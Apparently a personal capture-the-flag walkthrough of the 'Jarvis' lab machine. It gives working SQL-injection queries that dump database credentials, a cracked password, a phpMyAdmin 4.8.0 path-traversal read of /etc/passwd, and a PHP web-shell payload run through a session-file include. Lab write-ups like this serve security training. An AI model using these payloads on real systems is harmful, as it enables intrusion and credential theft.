----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Jarvis
# 15/3/2023
10.10.10.143

----------------------------------------------------
# creds
----------------------------------------------------
DBadmin:imissyou


----------------------------------------------------
# nmap
----------------------------------------------------
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))

----------------------------------------------------
# gobuster
----------------------------------------------------
/nav.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/images (Status: 301)
/js (Status: 301)
/index.php (Status: 200)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/room.php (Status: 302)
/connection.php (Status: 200)
/sass (Status: 301)


A lot of the links don’t work, or go to static pages. But in clicking around, 
I noticed clicking on one of the “Book Now” buttons leads to room.php, 
which takes a GET parameter: http://10.10.10.143/room.php?cod=1.


----------------------------------------------------
# sqli
----------------------------------------------------
List DBs	
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
Show Tables in hotel	
SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- -
Show Columns in room	
SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -
Show Tables in mysql	
SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -
Show Columns in user	
SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- -
Get Username / Password	SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -

DBadmin
2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
MYSQL5 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou

----------------------------------------------------
# exploitation
----------------------------------------------------

http://10.10.10.143/phpmyadmin/
DBadmin:imissyou

I can see the version is 4.8.0:

The LFI is because there is an inconsistency in 
how %3f is handled in the security check and the include. 
I can visit 
http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd
and see the include works:

lfi
http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd

Now it’s just a matter of getting some php code I want to run on the site. I can do that by issuing a SQL query, and then including my php session info.

I’ll click on the “SQL” tab at the top, and enter the query:

SELECT '<?php system($_GET["cmd"]);?>'
Now, I’ll include my php session info. I’ll check burp to grab my phpMyAdmin cookie, and visit: http://10.10.10.143/phpmyadmin/index.php?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_e3qctegac4saf72rocbl1541j26u7mqm
32pkjpcf63gkl0ko52n4m6b4d5